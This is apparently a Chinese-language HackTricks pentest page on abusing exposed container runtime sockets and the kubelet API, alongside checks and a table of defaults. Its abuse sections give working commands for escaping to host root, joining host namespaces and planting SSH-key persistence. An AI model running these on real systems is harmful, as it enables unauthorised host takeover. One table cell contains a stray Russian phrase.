# Runtime API 和 Daemon 暴露

{{#include ../../../banners/hacktricks-training.md}}

## 概述

许多真实的 container compromise 根本不是从 namespace escape 开始的，而是从访问 runtime control plane 开始的。如果某个 workload 能够通过挂载的 Unix socket 或暴露的 TCP listener 与 `dockerd`、`containerd`、CRI-O、Podman 或 kubelet 通信，攻击者可能就能请求创建一个具有更高权限的新 container、挂载 host filesystem、加入 host namespaces，或获取敏感的 node 信息。在这些情况下，runtime API 才是真正的 security boundary，而 compromise 它在实际上几乎等同于 compromise host。

这就是为什么 runtime socket exposure 应当与 kernel protections 分开记录。即使 container 具备普通的 seccomp、capabilities 和 MAC confinement，只要 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock` 被挂载到其中，它仍然可能距离 host compromise 只有一次 API call。当前 container 的 kernel isolation 可能完全按照设计正常运行，但 runtime management plane 仍然处于完全暴露状态。

## Daemon 访问模型

Docker Engine 传统上通过本地 Unix socket `unix:///var/run/docker.sock` 暴露其 privileged API。历史上，它也曾通过 `tcp://0.0.0.0:2375` 之类的 TCP listener，或通过 2376 上受 TLS 保护的 listener 进行远程暴露。在没有 strong TLS 和 client authentication 的情况下远程暴露 daemon，实际上会将 Docker API 变成一个 remote root interface。

containerd、CRI-O、Podman 和 kubelet 也暴露类似的 high-impact attack surfaces。它们的名称和工作流有所不同，但逻辑并没有区别。如果该 interface 允许调用方创建 workloads、挂载 host paths、获取 credentials，或修改正在运行的 containers，那么该 interface 就是一个 privileged management channel，应当按此进行处理。

值得检查的常见本地路径包括：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
较旧或更专用的 stacks 还可能暴露 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 等 endpoints。这些在现代环境中较不常见，但一旦发现，也应采取同样的谨慎态度，因为它们代表的是 runtime-control surfaces，而不是普通的 application sockets。

## Secure Remote Access

如果 daemon 必须暴露在 local socket 之外，则应使用 TLS 保护连接，并最好采用 mutual authentication，使 daemon 验证 client，同时 client 验证 daemon。出于便利而通过明文 HTTP 开放 Docker daemon 的旧习惯，是 container administration 中最危险的错误之一，因为该 API surface 足够强大，可以直接创建 privileged containers。

历史上的 Docker 配置模式如下：
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
在基于 systemd 的主机上，daemon 通信也可能显示为 `fd://`，这意味着进程从 systemd 继承了一个预先打开的 socket，而不是自行直接绑定。重要的经验并不在于确切语法，而在于其安全影响。一旦 daemon 的监听范围超出权限受到严格限制的本地 socket，传输安全和 client authentication 就从可选的加固措施变成了必需项。

## Abuse

如果存在 runtime socket，请确认它具体是哪一个、是否存在兼容的 client，以及是否可以通过 raw HTTP 或 gRPC 访问：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
这些命令很有用，因为它们可以区分路径失效、socket 已挂载但无法访问，以及可用的高权限 API。如果客户端成功运行，接下来的问题就是：该 API 是否能够通过 host bind mount 或 host namespace sharing 启动一个新 container。

### 未安装客户端时

没有安装 `docker`、`podman` 或其他友好的 CLI，并不意味着 socket 是安全的。Docker Engine 通过其 Unix socket 使用 HTTP 通信，而 Podman 则通过 `podman system service` 同时提供兼容 Docker 的 API 和原生 Libpod API。这意味着，即使是只有 `curl` 的极简环境，也可能足以驱动 daemon：
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
这在 post-exploitation 阶段很重要，因为防御者有时会移除常用的 client binaries，却留下已挂载的 management socket。在 Podman 主机上，请记住，高价值路径取决于部署是 rootful 还是 rootless：rootful service instances 使用 `unix:///run/podman/podman.sock`，rootless 使用 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`。

### 完整示例：Docker Socket 到 Host Root

如果可以访问 `docker.sock`，经典的 escape 方法是启动一个挂载 Host root filesystem 的新 container，然后对其执行 `chroot`：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
这通过 Docker daemon 提供直接的 host-root 执行能力。影响并不局限于读取文件。进入新容器后，攻击者可以修改主机文件、harvest credentials、植入 persistence，或启动其他 privileged workloads。

### Full Example: Docker Socket To Host Namespaces

如果攻击者更倾向于 namespace entry，而不是仅限于文件系统访问：
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
此路径通过请求 runtime 创建一个显式暴露 host namespace 的新 container 来访问 host，而不是利用当前 container。

### Docker Socket Persistence Pattern

Runtime control 也可用于 persistence，而不只是执行一次性 shell。通用模式是创建一个带有 host mount 的 helper container，将 authorized access material 或 startup hook 写入挂载的 host filesystem，然后验证 host 是否会使用它。

示例形式：
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
相同的思路可以根据 operator 想要证明的内容，针对 systemd units、cron fragments、application startup files 或 SSH keys。重要的是，持久化更改是通过 runtime daemon 对 host-level filesystem 的权限完成的，而不是通过赋予原始 container 额外的 privilege。

### Raw Docker API Helper Pivot

当 Docker CLI 不存在时，同样的 host-mount helper 流程可以通过 Unix socket 上的 HTTP 来驱动。通用流程是：确认 API，创建带有 host bind mount 的 helper container，启动它，创建一个 exec instance，然后启动该 exec。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
最终的 `/exec/<id>/start` 请求依赖于返回的 exec ID，但安全要点与具体的 JSON plumbing 无关：对 rootful Docker daemon 的 raw API 访问，足以请求更强权限的 helper workload。

### 完整示例：containerd Socket

挂载的 `containerd` Socket 通常同样危险：<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
如果存在更类似 Docker 的 client，那么 `nerdctl` 可能比 `ctr` 更方便，因为它提供了熟悉的 flags，例如 `--privileged`、`--pid=host` 和 `-v`：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影响同样是主机 compromise。即使不存在 Docker-specific tooling，另一个 runtime API 仍可能提供相同的管理权限。在 Kubernetes nodes 上，`crictl` 也可能足以进行 reconnaissance 和 container interaction，因为它直接与 CRI endpoint 通信。

### BuildKit Socket

`buildkitd` 很容易被忽略，因为人们通常认为它只是“build backend”，但该 daemon 仍然是一个 privileged control plane。可访问的 `buildkitd.sock` 可能允许攻击者运行 arbitrary build steps、检查 worker capabilities、使用 compromised environment 中的 local contexts，并在 daemon 被配置为允许时，请求 `network.host` 或 `security.insecure` 等 dangerous entitlements。

Useful first interactions are:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
如果 daemon 接受 build 请求，请测试是否可用不安全的 entitlements：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
具体影响取决于 daemon 配置，但启用了 rootful 且具有宽松 entitlements 的 BuildKit 服务并不是无害的开发便利工具。应将其视为另一个高价值的管理入口，尤其是在 CI runners 和共享构建节点上。

### Kubelet API Over TCP

kubelet 不是 container runtime，但它仍属于节点管理平面，通常也处于相同的信任边界讨论范围内。如果 workload 可以访问 kubelet secure port `10250`，或者节点凭据、kubeconfigs 或 proxy 权限被暴露，攻击者可能无需接触 Kubernetes API server admission path，就能够枚举 Pods、获取日志，或在节点本地容器中执行命令。

先从低成本的 discovery 开始：
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
如果 kubelet 或 API-server proxy 路径授权了 `exec`，支持 WebSocket 的客户端就可以将其转化为在节点上其他容器中执行代码的能力。这也是为什么仅拥有 `nodes/proxy` 的 `get` 权限仍然比听起来更加危险：该请求仍可到达能够执行命令的 kubelet endpoints，而这些直接与 kubelet 的交互不会出现在正常的 Kubernetes audit logs 中。<sup>[[2]](#references)</sup>

## Checks

这些检查旨在确认容器是否能够访问任何本应位于 trust boundary 外部的 management plane。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
这里有哪些值得关注的内容：

- 挂载的 runtime socket 通常是直接的管理权限原语，而不只是信息泄露。
- 未启用 TLS 的 `2375` TCP listener 应被视为可导致远程 compromise 的条件。
- `DOCKER_HOST` 等环境变量通常表明该 workload 的设计目的就是与 host runtime 通信。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认使用本地 Unix socket | `dockerd` 监听本地 socket，且 daemon 通常以 root 权限运行 | 挂载 `/var/run/docker.sock`、暴露 `tcp://...:2375`、`2376` 上的 TLS 配置薄弱或缺失 |
| Podman | 默认使用无 daemon 的 CLI | 普通本地使用不需要长期运行的特权 daemon；启用 `podman system service` 后仍可能暴露 API socket | 暴露 `podman.sock`、广泛运行该 service、使用 rootful API |
| containerd | 本地特权 socket | 管理 API 通过本地 socket 暴露，通常由更高层的 tooling 使用 | 挂载 `containerd.sock`、授予广泛的 `ctr` 或 `nerdctl` 访问权限、暴露特权 namespace |
| CRI-O | 本地特权 socket | CRI endpoint  предназначен для узловых доверенных компонентов | 挂载 `crio.sock`、向不受信任的 workload 暴露 CRI endpoint |
| Kubernetes kubelet | 节点本地管理 API | Kubelet 不应被 Pods 广泛访问；根据 authn/authz 配置，访问可能暴露 pod 状态、凭据和执行功能 | 挂载 kubelet socket 或 cert、kubelet auth 薄弱、使用 host networking 并访问 kubelet endpoint |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
